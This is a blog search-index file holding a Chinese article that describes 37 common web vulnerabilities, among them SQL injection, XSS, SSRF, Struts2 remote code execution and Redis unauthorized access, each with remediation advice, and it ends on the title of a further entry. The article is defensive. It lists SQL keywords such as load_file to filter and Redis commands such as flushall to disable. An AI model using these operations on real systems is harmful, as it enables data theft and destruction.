<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web常见漏洞描述及修复建议</title>
      <link href="/2021/07/23/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
      <url>/2021/07/23/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Web常见漏洞描述及修复建议"><a href="#Web常见漏洞描述及修复建议" class="headerlink" title="Web常见漏洞描述及修复建议"></a>Web常见漏洞描述及修复建议</h2><h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p><p>　　<strong>修复建议</strong></p><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p><p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p><p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p><p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p><p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p><p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p><p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p><p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>　　<strong>漏洞描述</strong></p><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p><p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p><p>XSS攻击可导致以下危害：</p><p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p><p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p><p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p><p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p><p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p><p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p><p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p><p>　　<strong>修复建议</strong></p><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p><p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p><p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p><p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p><p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p><h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h2><p>　　<strong>漏洞详情</strong></p><p>　　参考：<a href="https://www.freebuf.com/company-information/165769.html" target="_blank" rel="noopener">https://www.freebuf.com/company-information/165769.html</a></p><h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h2><p>　　<strong>漏洞描述**</strong>：**</p><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><p>　　<strong>修复建议</strong></p><p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p><p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p><h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h2><p>　　<strong>漏洞描述</strong></p><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p><p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p><p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p><p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p><p>　　(5)、利用File协议读取本地文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p><p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p><p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>　　4、验证请求的文件格式</p><p>　　5、禁止跳转</p><p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p><p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><h2 id="6-任意命令-代码执行"><a href="#6-任意命令-代码执行" class="headerlink" title="6.任意命令/代码执行"></a>6.任意命令/代码执行</h2><p>　　<strong>漏洞描述</strong></p><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p><p>　　<strong>修复建议</strong></p><p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>　　2、减少或不使用代码或命令执行函数</p><p>　　3、客户端提交的变量在放入函数前进行检测</p><p>　　4、减少或不使用危险函数</p><h2 id="7-任意文件上传"><a href="#7-任意文件上传" class="headerlink" title="7.任意文件上传"></a>7.任意文件上传</h2><p>　　<strong>漏洞描述</strong></p><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p><p>　　<strong>修复建议</strong></p><p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p><p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p><p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p><p>　　4、严格限制上传的文件路径。</p><p>　　5、文件扩展名服务端白名单校验。</p><p>　　6、文件内容服务端校验。</p><p>　　7、上传文件重命名。</p><p>　　8、隐藏上传文件路径。</p><h2 id="8-目录穿越-目录遍历"><a href="#8-目录穿越-目录遍历" class="headerlink" title="8.目录穿越/目录遍历"></a>8.目录穿越/目录遍历</h2><p>　　<strong>漏洞描述</strong></p><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p><p>　　<strong>修复建议</strong></p><p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</p><h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h2><p>　　<strong>漏洞描述</strong></p><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p><p>　　<strong>修复建议</strong></p><p>　　1、严格检查变量是否已经初始化。</p><p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</p><p>　　3、严格检查文件包含函数中的参数是否外界可控。</p><h2 id="10-弱口令"><a href="#10-弱口令" class="headerlink" title="10.弱口令"></a>10.弱口令</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p><p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p><p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p><p>　　3、增加人机验证机制，限制ip访问次数。</p><h2 id="11-暴力破解"><a href="#11-暴力破解" class="headerlink" title="11.暴力破解"></a>11.暴力破解</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p><p>　　<strong>修复建议</strong></p><p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p><p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p><p>　　3、增加人机验证机制</p><p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p><h2 id="12-越权访问"><a href="#12-越权访问" class="headerlink" title="12.越权访问"></a>12.越权访问</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p><p>　　<strong>修复建议</strong></p><p>　　1、对用户访问角色的权限进行严格的检查及限制。</p><p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制</p><h2 id="13-未授权访问"><a href="#13-未授权访问" class="headerlink" title="13.未授权访问"></a>13.未授权访问</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p><p>　　2、可以使用session对用户的身份进行判断和控制。</p><h2 id="14-列目录"><a href="#14-列目录" class="headerlink" title="14.列目录"></a>14.列目录</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p><p>　　2、设置目录访问权限</p><h2 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h2><p><strong>漏洞描述</strong></p><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p><p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p><p>　　<strong>修复建议</strong></p><p>　　1、对传入的对象进行严格的过滤检查</p><p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p><h2 id="16-http-slow拒绝服务攻击"><a href="#16-http-slow拒绝服务攻击" class="headerlink" title="16.http slow拒绝服务攻击"></a>16.http slow拒绝服务攻击</h2><p>　　<strong>漏洞描述</strong></p><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p><p>　　<strong>修复建议</strong></p><p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p><p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p><p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p><p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</p><h2 id="17-CRLF注入"><a href="#17-CRLF注入" class="headerlink" title="17.CRLF注入"></a>17.CRLF注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p><h2 id="18-LDAP注入"><a href="#18-LDAP注入" class="headerlink" title="18.LDAP注入"></a>18.LDAP注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p><p>　　<strong>修复建议</strong></p><p>　　对用户的输入内容进行严格的过滤。</p><h2 id="19-URL-跳转"><a href="#19-URL-跳转" class="headerlink" title="19.URL 跳转"></a>19.URL 跳转</h2><p>　　<strong>漏洞描述</strong></p><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p><p>　　<strong>修复建议</strong></p><p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p><p>　　2、白名单规定跳转链接</p><h2 id="20-明文传输"><a href="#20-明文传输" class="headerlink" title="20.明文传输"></a>20.明文传输</h2><p>　　<strong>漏洞描述</strong></p><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p><p>　　<strong>修复建议</strong></p><p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p><p>　　2、使用https来保证传输的安全。</p><h2 id="21-网页木马"><a href="#21-网页木马" class="headerlink" title="21.网页木马"></a>21.网页木马</h2><p>　　<strong>漏洞描述</strong></p><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p><p>　　2、发现并及时修复已存在的漏洞。</p><p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p><h2 id="22-备份文件泄露"><a href="#22-备份文件泄露" class="headerlink" title="22.备份文件泄露"></a>22.备份文件泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p><p>　　<strong>修复建议</strong></p><p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p><p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p><h2 id="23-敏感信息泄露"><a href="#23-敏感信息泄露" class="headerlink" title="23.敏感信息泄露"></a>23.敏感信息泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p><p>　　<strong>修复建议</strong></p><p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p><p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p><p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p><p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p><h2 id="24-短信-邮件轰炸"><a href="#24-短信-邮件轰炸" class="headerlink" title="24.短信/邮件轰炸"></a>24.短信/邮件轰炸</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p><p>　　<strong>修复建议</strong></p><p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p><h2 id="25-phpinfo信息泄漏"><a href="#25-phpinfo信息泄漏" class="headerlink" title="25.phpinfo信息泄漏"></a>25.phpinfo信息泄漏</h2><p>　　<strong>漏洞描述</strong></p><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p><p>　　<strong>修复建议</strong></p><p>　　1、删除phpinfo 函数。</p><p>　　2、若文件无用可直接删除。 </p><h2 id="26-IIS短文件名泄露漏洞"><a href="#26-IIS短文件名泄露漏洞" class="headerlink" title="26.IIS短文件名泄露漏洞"></a>26.IIS短文件名泄露漏洞</h2><p>　　<strong>漏洞描述</strong></p><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p><p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p><p>　　<strong>修复建议</strong></p><p>　　修改Windows配置，关闭短文件名功能。</p><p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p><p>　　2.如果是虚拟主机空间用户,可采用以下修复方案：</p><p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p><p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p><p>　　3）升级net framework 至4.0以上版本。</p><p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a href="http://www.back，然后删除原文件夹D:\\www，再重命名D:\\www.back到D:\\www。如果不重新复制，已经存在的短文件名则是不会消失的。" target="_blank" rel="noopener">www.back，然后删除原文件夹D:\\www，再重命名D:\\www.back到D:\\www。如果不重新复制，已经存在的短文件名则是不会消失的。</a></p><h2 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p><p>　　<strong>修复建议</strong></p><p>　　1、自定义错误页面或使用统一的错误页面提示。</p><h2 id="28-Apache-Tomcat默认文件"><a href="#28-Apache-Tomcat默认文件" class="headerlink" title="28.Apache Tomcat默认文件"></a>28.Apache Tomcat默认文件</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p><p>　　<strong>修复建议</strong></p><p>　　1、删除样例文件</p><p>　　2、限制文件访问权限</p><h2 id="29-Crossdomain-xml-配置不当"><a href="#29-Crossdomain-xml-配置不当" class="headerlink" title="29.Crossdomain.xml 配置不当"></a>29.Crossdomain.xml 配置不当</h2><p>　　<strong>漏洞描述</strong></p><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p><p>　　<strong>修复建议</strong></p><p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p><h2 id="30-目标服务器启用了不安全-HTTP-方法"><a href="#30-目标服务器启用了不安全-HTTP-方法" class="headerlink" title="30.目标服务器启用了不安全 HTTP 方法"></a>30.目标服务器启用了不安全 HTTP 方法</h2><p>　　<strong>漏洞描述</strong></p><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、关闭不安全的传输方法，只开启POST、GET方法。</p><p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p><h2 id="31-weblogic-SSRF服务器请求伪造"><a href="#31-weblogic-SSRF服务器请求伪造" class="headerlink" title="31.weblogic SSRF服务器请求伪造"></a>31.weblogic SSRF服务器请求伪造</h2><p>　　<strong>漏洞描述</strong></p><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p><p>　　<strong>修复建议</strong></p><p>　　1、若不影响业务则可删除uddiexplorer文件夹</p><p>　　2、限制uddiexplorer应用只能内网访问</p><h2 id="32-Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#32-Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="32.Apache Struts2 远程代码执行漏洞（S2-019）"></a>32.Apache Struts2 远程代码执行漏洞（S2-019）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p><p>　　2、或者手工设置struts.xml文件&lt;constantname=”struts.enable.DynamicMethodInvocation”value=”false”/&gt;</p><h2 id="33-Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#33-Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="33.Apache Struts2 远程代码执行漏洞（S2-037）"></a>33.Apache Struts2 远程代码执行漏洞（S2-037）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p><p>　　<strong>修复建议</strong></p><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><h2 id="34-Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#34-Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="34.Apache Struts2 DevMode 远程代码执行漏洞"></a>34.Apache Struts2 DevMode 远程代码执行漏洞</h2><p>　　<strong>漏洞描述</strong></p><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p><p>　　<strong>修复建议</strong></p><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=”struts.devMode”value=”false”/&gt;。</p><h2 id="35-Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#35-Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="35.Apache Struts2 远程代码执行漏洞（S2-045）"></a>35.Apache Struts2 远程代码执行漏洞（S2-045）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p><p>　　<strong>修复建议</strong></p><p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p><p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p><p>　　2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p><p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p><p>　　4、修改WEB-INF/classes目录下的配置</p><p>　　在WEB-INF/classes目录下的struts.xml中的struts 标签下添加</p><p>　　&lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；</p><p>　　在WEB-INF/classes/目录下添加global.properties，文件内容如下:</p><p>　　struts.messages.upload.error.InvalidContentTypeException=1</p><h2 id="36-Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#36-Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="36.Apache Struts2 远程代码执行漏洞（S2-033）"></a>36.Apache Struts2 远程代码执行漏洞（S2-033）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、用户到官方获取最新补丁或者最新版本程序。</p><p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p><h2 id="37-redis相关漏洞修复"><a href="#37-redis相关漏洞修复" class="headerlink" title="37.redis相关漏洞修复"></a>37.redis相关漏洞修复</h2><p>补充来自博客园：@梦猩魂</p><p>完善来自博客园：@我超怕的</p><p><strong>漏洞描述</strong></p><p>redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p><p><strong>安全建议</strong></p><p>1.禁用一些高危命令</p><p>　　常见如：flushdb，flushall，config，keys 等</p><p>2.以低权限运行 Redis 服务</p><p>3.为 Redis 添加密码验证</p><p>4.禁止外网访问 Redis</p><p>5.保证 authorized_keys 文件的安全</p><p>俗人昭昭，我独昏昏。俗人察察，我独闷闷。</p>]]></content>
      
      
      <categories>
          
          <category> 文档 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node-RED ui_base 任意文件读取漏洞</title>
